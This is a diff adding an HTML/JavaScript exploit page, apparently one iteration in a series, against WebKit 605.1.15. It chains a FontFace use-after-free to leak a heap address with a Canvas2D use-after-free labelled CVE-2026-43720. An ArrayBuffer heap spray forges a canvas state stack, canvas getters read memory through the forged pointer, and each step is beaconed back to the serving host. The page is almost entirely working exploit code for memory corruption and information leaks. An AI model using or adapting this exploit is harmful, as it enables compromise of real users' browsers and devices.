@@ -1,0 +1,322 @@
+<!--
+  p649d: Canvas2D forge — GETTER ONLY (no save/restore/setters)
+
+  p649/b/c crashed because save() does m_stateStack.append(state()) on
+  WebKit 605.1.15 (pre-2020, no m_unrealizedSaveCount optimization).
+  append() tries to grow the vector → fastRealloc on forged pointer → crash.
+
+  FIX: Only call GETTERS. lineWidth getter is just:
+    return state().lineWidth;
+  = return m_stateStack.last().lineWidth;
+  = return *(m_buffer + (m_size-1)*sizeof(State) + lineWidth_offset);
+
+  With {T, 1|1} pattern (T from FontFace):
+    m_buffer = T, m_size = 1
+    → reads double from T + lineWidth_offset_in_State
+    T points to freed HashTable — readable heap memory in bmalloc
+
+  NOTE: DAZ is ON (p648 confirmed). Heap pointers (0x100xxxxxxx) are
+  IEEE denormals and get flushed to 0.0. But non-denormal values at T
+  (if any) come through normally.
+
+  CRASH_CLASS: HIGH — reads through forged pointer, might fault if T is unmapped
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649d</title></head>
+<body>p649d: Canvas2D getter-only forge
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649D-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: FontFace UAF → leak heap address T
+// ================================================================
+var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+retained.push(ffA);
+
+var ffStyle = document.createElement('style');
+ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(ffStyle);
+
+var ffFired = false;
+var ffBufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffFired) return undefined;
+    ffFired = true;
+    ffStyle.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      ffBufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em ff0, ffs0', 'AB');
+
+setTimeout(function() {
+try {
+  var T_lo = 0, T_hi = 0;
+  var ffHit = -1;
+
+  for (var i = 0; i < ffBufs.length; i++) {
+    var v = ffBufs[i];
+    var nonzero = 0;
+    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
+    if (nonzero > 0) {
+      ffHit = i;
+      var dv = new DataView(v.buffer);
+      T_lo = dv.getUint32(0x58, true);
+      T_hi = dv.getUint32(0x5C, true);
+      emit('FF-HIT', 'buf[' + i + '] nz=' + nonzero + ' T=0x' + hex32(T_hi) + hex32(T_lo));
+      break;
+    }
+  }
+  if (ffHit < 0) {
+    emit('FF-MISS', 'no reclaim — ABORT (need T for forge)');
+    flush();
+    return;
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 2: Canvas2D UAF (CVE-2026-43720) — DETACHED canvas
+  // ================================================================
+  var uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 1; uafCanvas.height = 1;
+
+  var innerCtx = null;
+  var gFired = false;
+  var cvOpts = {};
+  Object.defineProperty(cvOpts, 'alpha', {
+    get: function() {
+      gFired = true;
+      innerCtx = uafCanvas.getContext('2d');
+      return true;
+    }
+  });
+
+  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}
+
+  emit('CV-UAF', 'getter=' + gFired + ' inner=' + !!innerCtx);
+  flush();
+  if (!innerCtx) { emit('ABORT', 'no inner ctx'); flush(); return; }
+
+  // ================================================================
+  // PHASE 3: AB(768) spray with {T, 1|1} pattern every 16B
+  // m_stateStack at any 16B-aligned offset → m_buffer=T, m_size=1
+  // lineWidth getter → reads from T + lineWidth_offset_in_State
+  // ================================================================
+  var AB_N = 300;
+  var abViews = [];
+  var abDVs = [];
+
+  var tmpl = new ArrayBuffer(768);
+  var tmplDV = new DataView(tmpl);
+  for (var off = 0; off < 768; off += 16) {
+    tmplDV.setUint32(off + 0, T_lo, true);
+    tmplDV.setUint32(off + 4, T_hi, true);
+    tmplDV.setUint32(off + 8, 1, true);   // m_capacity
+    tmplDV.setUint32(off + 12, 1, true);   // m_size
+  }
+  var tmplU8 = new Uint8Array(tmpl);
+
+  for (var i = 0; i < AB_N; i++) {
+    var ab = new ArrayBuffer(768);
+    new Uint8Array(ab).set(tmplU8);
+    abViews.push(new Uint8Array(ab));
+    abDVs.push(new DataView(ab));
+    retained.push(ab);
+  }
+
+  emit('SPRAY', AB_N + ' AB(768) {T,1|1}');
+  flush();
+
+  // ================================================================
+  // PHASE 4: GETTER-ONLY reads (no save/restore/setters)
+  // Each getter beacons BEFORE the call so crash location is known
+  // ================================================================
+
+  // 4a: lineWidth
+  emit('G', 'lineWidth...');
+  flush();
+  var lw = null;
+  try {
+    lw = innerCtx.lineWidth;
+    emit('LW', lw + ' hex=' + d2hex(lw));
+  } catch(e) {
+    emit('LW', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4b: miterLimit
+  emit('G', 'miterLimit...');
+  flush();
+  try {
+    var ml = innerCtx.miterLimit;
+    emit('ML', ml + ' hex=' + d2hex(ml));
+  } catch(e) {
+    emit('ML', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4c: globalAlpha
+  emit('G', 'globalAlpha...');
+  flush();
+  try {
+    var ga = innerCtx.globalAlpha;
+    emit('GA', ga + ' hex=' + d2hex(ga));
+  } catch(e) {
+    emit('GA', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4d: getTransform (6 doubles)
+  emit('G', 'getTransform...');
+  flush();
+  try {
+    var t = innerCtx.getTransform();
+    emit('XF', 'a=' + d2hex(t.a) + ' b=' + d2hex(t.b));
+    emit('XF', 'c=' + d2hex(t.c) + ' d=' + d2hex(t.d));
+    emit('XF', 'e=' + d2hex(t.e) + ' f=' + d2hex(t.f));
+  } catch(e) {
+    emit('XF', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4e: shadowBlur (float, not double in older WebKit)
+  emit('G', 'shadowBlur...');
+  flush();
+  try {
+    var sb = innerCtx.shadowBlur;
+    emit('SB', sb + ' hex=' + d2hex(sb));
+  } catch(e) {
+    emit('SB', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4f: shadowOffsetX/Y
+  emit('G', 'shadowOffset...');
+  flush();
+  try {
+    emit('SOX', innerCtx.shadowOffsetX + ' hex=' + d2hex(innerCtx.shadowOffsetX));
+    emit('SOY', innerCtx.shadowOffsetY + ' hex=' + d2hex(innerCtx.shadowOffsetY));
+  } catch(e) {
+    emit('SO', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4g: lineDashOffset
+  emit('G', 'lineDashOffset...');
+  flush();
+  try {
+    var ldo = innerCtx.lineDashOffset;
+    emit('LDO', ldo + ' hex=' + d2hex(ldo));
+  } catch(e) {
+    emit('LDO', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // 4h: canvas property (returns associated element, not state)
+  emit('G', 'canvas...');
+  flush();
+  try {
+    var cv = innerCtx.canvas;
+    emit('CV', typeof cv + ' ' + (cv === uafCanvas ? 'MATCH' : 'MISMATCH') +
+      (cv ? ' tag=' + cv.tagName : ' null'));
+  } catch(e) {
+    emit('CV', 'EXC:' + String(e).slice(0,50));
+  }
+  flush();
+
+  // ================================================================
+  // PHASE 5: Scan ABs for any modified bytes (engine might have touched the struct)
+  // ================================================================
+  var modAB = -1;
+  var modCount = 0;
+  var modOffsets = [];
+
+  for (var ai = 0; ai < abViews.length; ai++) {
+    var v = abViews[ai];
+    var diffs = 0;
+    for (var off = 0; off < 768; off++) {
+      if (v[off] !== tmplU8[off]) {
+        diffs++;
+        if (modAB < 0) {
+          modAB = ai;
+        }
+        if (ai === modAB && modOffsets.length < 20) {
+          modOffsets.push(off);
+        }
+      }
+    }
+    if (diffs > 0) modCount++;
+  }
+
+  emit('SCAN', modCount + ' ABs modified, first=AB[' + modAB + ']');
+  if (modOffsets.length > 0) {
+    emit('MODS', modOffsets.map(function(o) { return '0x'+o.toString(16); }).join(','));
+  }
+  flush();
+
+  // Dump modified AB if found
+  if (modAB >= 0) {
+    var hv = abViews[modAB];
+    for (var row = 0; row < 768; row += 32) {
+      var hex = '';
+      var hasDiff = false;
+      for (var j = 0; j < 32 && row + j < 768; j++) {
+        hex += ('0' + hv[row + j].toString(16)).slice(-2);
+        if (hv[row + j] !== tmplU8[row + j]) hasDiff = true;
+      }
+      if (hasDiff) {
+        emit('DUMP', '+0x' + ('000' + row.toString(16)).slice(-3) + ': ' + hex);
+      }
+    }
+    flush();
+  }
+
+  emit('ALIVE', 'all getters tested');
+  flush();
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 250);
+})();
+</script>
+</body></html>
